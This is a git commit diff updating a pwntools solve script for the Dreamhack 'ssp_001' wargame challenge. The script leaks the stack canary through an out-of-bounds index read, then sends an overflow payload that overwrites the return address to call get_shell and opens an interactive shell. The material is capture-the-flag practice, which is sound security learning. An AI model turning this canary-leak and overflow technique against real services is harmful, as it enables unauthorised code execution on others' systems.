7c5aad76565dcd1854b3d17ea62c9d8d90058b5c
yeekrim <kr031106@naver.com>
2024-04-05 00:06:24 +0900

    6

--- ssp_001/solve.py
+++ ssp_001/solve.py
@@ -1,26 +1,21 @@
 from pwn import *
 #context.log_level = 'debug'
-p=remote('host3.dreamhack.games', 24042)
-e=ELF('./ssp_001')
-canary = ''
-get_shell = e.symbols['get_shell']
+p=remote('host3.dreamhack.games', 11797)
+e=ELF('./ssp')
+canary = b""
+get_shell = 0x080486cb
 
-#canary leak
-for i in range(131, 127, -1):
-    p.sendafter('> ', 'P')
-    p.sendlineafter('Element index : ', str(i))
-    p.recvuntil(' : ')
-    canary += p.recv(2)
+for i in range(131,127,-1) :
+    p.sendlineafter("> ", 'P')
+    p.sendlineafter("Element index : ", str(i))
+    p.recvuntil("is : ")
+    canary += p.recvn(2)
+
 canary = int(canary, 16)
-log.info('[+]canary: 0x%x' %canary)
 
-#exploit
-payload = "A"*64
-payload += p32(canary)
-payload += "B"*8
-payload += p32(get_shell)
+p.sendlineafter("> ", "E")
+p.sendlineafter("Name Size : ", str(80))
+payload = b"A"*64 + p32(canary) + b"A"*8 + p32(get_shell)
+p.sendlineafter("Name : ", payload)
 
-p.sendafter('> ', 'E')
-p.sendlineafter('Name Size : ', '200')
-p.sendafter('Name : ', payload)
 p.interactive()
